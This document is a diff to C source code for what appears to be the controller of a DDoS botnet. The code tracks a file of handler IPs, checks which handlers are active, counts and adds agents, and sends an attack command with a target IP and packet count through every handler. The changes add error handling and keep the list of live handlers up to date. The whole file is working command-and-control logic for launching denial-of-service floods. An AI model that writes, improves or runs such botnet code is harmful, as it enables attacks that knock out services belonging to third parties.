@@ -7,6 +7,8 @@
 
 #define ERROR -1
 #define DEFAULT_PKTS_NUMBER 100
+#define VALIDATED_HANDLERS_FILE_NAME "valid_handlers.txt"
+#define TMP_FILE "tmp.txt"
 
 typedef enum
 {
@@ -127,103 +129,30 @@ Exit:
 
 static int interrograte_hanler(int sock, char* handler_ip, void *data)
 {
-    int version;
+    int version, rv;
     ddos_request_t req = {};
     ddos_responce_t resp = {};
 
     req.cmd = htons(DDOS_CMD_INTERROGATE_HANDLER);
 
-    send_data(sock, &req, sizeof(ddos_request_t), handler_ip,
+    rv = send_data(sock, &req, sizeof(ddos_request_t), handler_ip,
             DDOS_HANDL_SRV_PORT);
+    if (rv < 0)
+	return ERROR;
 
-    if ((recv_data(sock, &resp, sizeof(ddos_responce_t), NULL)) < 0)
+    rv = recv_data(sock, &resp, sizeof(ddos_responce_t), NULL);
+    if (rv < 0 || !(version = ntohs(resp.data)))
+    {
         fprintf(stdout, "Hanlder %s is inactive.\n", handler_ip);
-    else
-    {
-        version = ntohs(resp.data);
-        fprintf(stdout, "Hanlder %s is active, version %d.\n", handler_ip, version);
+	return 1;
+
     }
+    fprintf(stdout, "Hanlder %s is active, version %d.\n", handler_ip, version);
 
     return 0;
 }
 
-static int ddns_add_agent(int sock, char *handler_ip, char *agent_ip)
-{
-    int handler_version;
-    ddos_request_t req;
-    ddos_responce_t resp;
-
-    handler_version = interrograte_hanler(sock, handler_ip, NULL);
-    if (!handler_version)
-    {
-        fprintf(stderr, "Handler %s is unavailible\n", handler_ip);
-        return ERROR;
-    }
-    fprintf(stdout, "Handler %s is availible. Version %d\n", handler_ip, handler_version);
-
-    req.cmd = htons(DDOS_CMD_ADD_AGENT);
-    strcpy(req.ip, agent_ip);
-
-    send_data(sock, &req, sizeof(ddos_request_t), handler_ip,
-            DDOS_HANDL_SRV_PORT);
-
-    recv_data(sock, &resp, sizeof(ddos_responce_t), NULL);
-    if (ntohs(resp.status) == DDOS_OK)
-        fprintf(stderr, "Agent %s was added\n", agent_ip);
-    else
-        fprintf(stderr, "Agent %s wasn't added %d\n", agent_ip, ntohs(resp.status));
-
-    return 0;
-}
-
-static int validate_agents(int sock, char *handler_ip, void *data)
-{
-    int agents_number;
-    ddos_request_t req;
-    ddos_responce_t resp;
-
-    req.cmd = htons(DDOS_CMD_INTERROGATE_AGENTS);
-    send_data(sock, &req, sizeof(ddos_request_t), handler_ip,
-            DDOS_HANDL_SRV_PORT);
-
-    if ((recv_data(sock, &resp, sizeof(ddos_responce_t), NULL)) < 0)
-        fprintf(stdout, "Hanlder %s is inactive.\n", handler_ip);
-    else
-    {
-        agents_number = ntohs(resp.data);
-        fprintf(stdout, "Hanlder %s is active, agent number: %d.\n",
-                handler_ip, agents_number);
-    }
-
-    return agents_number;
-}
-
-static int count_agents(int sock, char *handler_ip, void *data)
-{
-    int *agents = data;
-    *agents += validate_agents(sock, handler_ip, NULL);
-
-    return 0;
-}
-
-static int attack(int sock, char *handler_ip, void *data)
-{
-    attack_data_t *attack_data = data;
-    ddos_request_t req;
-
-    req.cmd = htons(DDOS_CMD_ATTACK);
-    req.pkts = htons(attack_data->pkts);
-    strcpy(req.ip, attack_data->target_ip);
-
-    send_data(sock, &req, sizeof(ddos_request_t), handler_ip,
-            DDOS_HANDL_SRV_PORT);
-
-    return 0;
-}
-
-#define VALIDATED_HANDLERS_FILE_NAME "valid_handlers.txt"
 typedef int (*action_cb_t)(int sock, char *hanler_ip, void *data);
-
 static int for_each_handler(int sock, char *handlers_file, action_cb_t action_cb,
         void *action_data)
 {
@@ -231,7 +160,11 @@ static int for_each_handler(int sock, char *handlers_file, action_cb_t action_cb
     char *line = NULL;
     size_t len = 0;
     ssize_t read;
-    char ip[16] = {};
+    char ip[INET_ADDRSTRLEN] = {};
+    int is_same_file = 0;
+
+    if (!strcmp(handlers_file, VALIDATED_HANDLERS_FILE_NAME))
+	is_same_file = 1;
 
     fp = fopen(handlers_file, "r");
     if (fp == NULL)
@@ -240,21 +173,31 @@ static int for_each_handler(int sock, char *handlers_file, action_cb_t action_cb
         goto Error;
     }
 
-    valid_fp = fopen(VALIDATED_HANDLERS_FILE_NAME, "w");
+    valid_fp = fopen(is_same_file ? TMP_FILE : VALIDATED_HANDLERS_FILE_NAME, "w");
     if (valid_fp == NULL)
     {
-        fprintf(stderr, "Could not create valid_hanlers file \"%s\".\n", handlers_file);
+        fprintf(stderr, "Could not create valid_hanlers file \"%s\".\n",
+		VALIDATED_HANDLERS_FILE_NAME);
         goto Error;
     }
 
     while ((read = getline(&line, &len, fp)) != ERROR)
     {
-        strncpy(ip, line, read - 1);
-        action_cb(sock, ip, action_data);
+        strncpy(ip, line, (read - (strchr(line, '\n') ?  1 : 0)));
+        if (!action_cb(sock, ip, action_data))
+	    fprintf(valid_fp, "%s\n", ip);
+	memset(ip, 0, INET_ADDRSTRLEN);
+    }
+
+    if (is_same_file)
+    {
+	remove(VALIDATED_HANDLERS_FILE_NAME);
+	rename(TMP_FILE, VALIDATED_HANDLERS_FILE_NAME);
     }
 
     fclose(fp);
     fclose(valid_fp);
+
 
     return 0;
 
@@ -266,6 +209,146 @@ Error:
     free(line);
 
     return ERROR;
+}
+typedef struct 
+{
+    int need_add;
+    int need_rm;
+    char *ip;
+} update_handler_list_t;
+
+static int is_handler_needed(int sock, char *ip, void *data)
+{
+    update_handler_list_t *upd = data;
+
+    if (!strcmp(upd->ip, ip) && (strlen(upd->ip) == strlen(ip)))
+    {
+	if (upd->need_add)
+	    upd->need_add = 0;
+	else if (upd->need_rm)
+	    return 1;
+    }
+
+    return 0;
+}
+
+static int ddns_add_agent(int sock, char *handler_ip, char *agent_ip)
+{
+    int handler_version, rv;
+    ddos_request_t req;
+    ddos_responce_t resp;
+    update_handler_list_t upd = {};
+    FILE *fp;
+
+    req.cmd = htons(DDOS_CMD_ADD_AGENT);
+    strcpy(req.ip, agent_ip);
+
+    rv = send_data(sock, &req, sizeof(ddos_request_t), handler_ip,
+            DDOS_HANDL_SRV_PORT);
+    if (rv < 0)
+	return ERROR;
+
+    rv = recv_data(sock, &resp, sizeof(ddos_responce_t), NULL);
+    upd.ip = handler_ip;
+    if (rv < 0 || !(handler_version = ntohs(resp.data)))
+    {
+	fprintf(stderr, "Handler %s is unavailible\n", handler_ip);
+	upd.need_rm = 1;
+    }
+    else
+    {
+	fprintf(stdout, "Handler %s is availible. Version %d\n", handler_ip, handler_version);
+	upd.need_add = 1;
+    }
+    for_each_handler(sock, VALIDATED_HANDLERS_FILE_NAME, is_handler_needed, &upd);
+    if (!upd.need_add)
+	return upd.need_rm;
+
+    fp = fopen(VALIDATED_HANDLERS_FILE_NAME, "a");
+    if (fp == NULL)
+    {
+        fprintf(stderr, "Could not open agents file \"%s\".\n",
+		VALIDATED_HANDLERS_FILE_NAME);
+        return ERROR;
+    }
+    fprintf(fp, "%s\n", handler_ip);
+
+    if (ntohs(resp.status) == DDOS_OK)
+        fprintf(stderr, "Agent %s was added\n", agent_ip);
+    else
+        fprintf(stderr, "Agent %s wasn't added %d\n", agent_ip, ntohs(resp.status));
+
+    return 0;
+}
+
+static int validate_agents(int sock, char *handler_ip, void *data)
+{
+    int agents_number, rv;
+    ddos_request_t req;
+    ddos_responce_t resp;
+
+    req.cmd = htons(DDOS_CMD_INTERROGATE_AGENTS);
+    rv = send_data(sock, &req, sizeof(ddos_request_t), handler_ip,
+            DDOS_HANDL_SRV_PORT);
+    if (rv < 0)
+	return ERROR;
+
+    rv = recv_data(sock, &resp, sizeof(ddos_responce_t), NULL);
+    if (rv < 0)
+    {
+	if (!data)
+	    fprintf(stdout, "Hanlder %s is inactive.\n", handler_ip);
+	return 1;
+    }
+
+    else
+    {
+        agents_number = ntohs(resp.data);
+	if (!data)
+	{
+	    fprintf(stdout, "Hanlder %s is active, agents number: %d.\n",
+		    handler_ip, agents_number);
+	}
+	else
+	    *(int *)data = agents_number;
+    }
+
+    return 0;
+}
+
+static int count_agents(int sock, char *handler_ip, void *data)
+{
+    int *agents_cnt = data;
+    int agents_per_handler;
+
+    if (!validate_agents(sock, handler_ip, &agents_per_handler))
+	*agents_cnt += agents_per_handler;
+
+    return 0;
+}
+
+static int attack(int sock, char *handler_ip, void *data)
+{
+    attack_data_t *attack_data = data;
+    ddos_request_t req;
+    ddos_responce_t resp;
+    int rv;
+
+    req.cmd = htons(DDOS_CMD_ATTACK);
+    req.pkts = htons(attack_data->pkts);
+    strcpy(req.ip, attack_data->target_ip);
+
+    rv = send_data(sock, &req, sizeof(ddos_request_t), handler_ip,
+            DDOS_HANDL_SRV_PORT);
+
+    if (rv < 0)
+	return ERROR;
+
+    rv = recv_data(sock, &resp, sizeof(ddos_responce_t), NULL);
+    if (rv < 0 || (ntohs(resp.status) != DDOS_OK))
+	return 1;
+
+    return 0;
 }
 
 int main(int argc, char *argv[])
@@ -295,11 +378,18 @@ int main(int argc, char *argv[])
             break;
         case CMD_COUNT_AGENTS:
             rv = for_each_handler(sock, argv[2], count_agents, &agents);
+	    fprintf(stdout, "Avalible agents: %d\n", agents);
             break;
         case CMD_ATTACK:
-            pkts = (argc > 3) ? atoi(argv[4]) : DEFAULT_PKTS_NUMBER;
+            pkts = (argc > 4) ? atoi(argv[4]) : DEFAULT_PKTS_NUMBER;
             rv = for_each_handler(sock, argv[2], count_agents, &agents);
-            attack_data.pkts = pkts / agents;
+	    if (!agents)
+	    {
+		fprintf(stdout, "No avalible agents!\n");
+		goto Exit;
+	    }
+
+            attack_data.pkts = (int)(pkts / agents);
             attack_data.target_ip = argv[3];
             rv = for_each_handler(sock, argv[2], attack, &attack_data);
             break;
@@ -307,7 +397,8 @@ int main(int argc, char *argv[])
             break;
     }
 
+Exit:
     destroy_socket(sock);
 
-    return rv;
+    return (rv < 0) ? 1 : 0;
 }
